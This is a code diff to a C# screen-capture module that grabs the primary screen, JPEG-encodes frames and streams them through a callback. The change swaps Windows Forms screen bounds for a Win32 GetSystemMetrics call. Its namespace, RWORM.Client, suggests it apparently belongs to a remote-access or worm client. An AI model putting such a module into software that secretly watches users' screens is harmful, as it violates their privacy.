@@ -2,17 +2,22 @@ using System;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
+using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 
 namespace RWORM.Client.Modules
 {
     /// <summary>
     /// Captures the primary screen, JPEG-compresses, and streams frames via OnFrame callback.
+    /// Pure Win32 screen bounds without Windows Forms dependencies.
     /// </summary>
     public class RemoteDesktop : IDisposable
     {
+        [DllImport("user32.dll")] static extern int GetSystemMetrics(int nIndex);
+        private const int SM_CXSCREEN = 0;
+        private const int SM_CYSCREEN = 1;
+
         private CancellationTokenSource? _cts;
         private bool _running;
 
@@ -50,10 +55,11 @@ namespace RWORM.Client.Modules
             {
                 try
                 {
-                    var bounds = Screen.PrimaryScreen?.Bounds
-                                 ?? new Rectangle(0, 0, 1920, 1080);
-                    if (bounds.Width <= 0 || bounds.Height <= 0)
-                        bounds = new Rectangle(0, 0, 1920, 1080);
+                    int w = GetSystemMetrics(SM_CXSCREEN);
+                    int h = GetSystemMetrics(SM_CYSCREEN);
+                    if (w <= 0) w = 1920;
+                    if (h <= 0) h = 1080;
+                    var bounds = new Rectangle(0, 0, w, h);
 
                     using var bmp = new Bitmap(bounds.Width, bounds.Height,
                                                PixelFormat.Format32bppArgb);
@@ -70,9 +76,10 @@ namespace RWORM.Client.Modules
                         frame = ms.ToArray();
                     }
 
-                    if (OnFrame != null) await OnFrame(frame);
+                    if (OnFrame != null)
+                        await OnFrame(frame);
                 }
-                catch { }   // transient capture failure — skip the frame
+                catch { }
 
                 await Task.Delay(interval);
             }
@@ -82,7 +89,7 @@ namespace RWORM.Client.Modules
         {
             foreach (var c in ImageCodecInfo.GetImageEncoders())
                 if (c.FormatID == ImageFormat.Jpeg.Guid) return c;
-            throw new Exception("JPEG encoder not found");
+            throw new NotSupportedException("JPEG encoder not found");
         }
 
         public void Dispose() => Stop();
